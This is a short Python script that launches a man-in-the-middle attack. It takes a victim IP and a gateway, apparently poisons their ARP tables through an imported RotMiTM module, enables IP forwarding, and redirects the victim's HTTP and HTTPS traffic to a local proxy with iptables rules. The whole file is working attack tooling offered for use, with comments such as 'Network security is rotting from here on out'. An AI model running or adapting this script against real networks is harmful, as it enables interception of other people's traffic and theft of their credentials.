
from RotMiTM import RotMiTM
import os

def main():
  rotmitm=RotMiTM()
  interface,victimIP,gatewayIP=rotmitm.startupQuiz()
  # Useless printing...
  print "[+] Poisoning with:"
  print "\tIface: "+interface
  print "\tTarget: "+victimIP
  print "\tGateway: "+gatewayIP

  # Turn on IP Forwarding
  os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
  print "\n[+] IP Forwarding Enabled"

  # Set IPTables to route 80,443 to Proxy at 8080
  print "[*] Setting IPTables PREROUTING Rules.."
  http="iptables -t nat -A PREROUTING -i "+interface+" -p tcp -m tcp --dport 80 -j REDIRECT --to-ports 8080"
  https="iptables -t nat -A PREROUTING -i "+interface+" -p tcp -m tcp --dport 443 -j REDIRECT --to-ports 8080"
  os.system(http)
  os.system(https)
  # Network security is rotting from here on out...
  rotmitm.rot(victimIP, gatewayIP, interface)

  #Restore IPTables
  print "[*] Releasing IPTables PREROUTING Rules.."
  http="iptables -t nat -D PREROUTING -i "+interface+" -p tcp -m tcp --dport 80 -j REDIRECT --to-ports 8080"
  https="iptables -t nat -D PREROUTING -i "+interface+" -p tcp -m tcp --dport 443 -j REDIRECT --to-ports 8080"
  os.system(http)
  os.system(https)

if __name__ == "__main__":
  main()

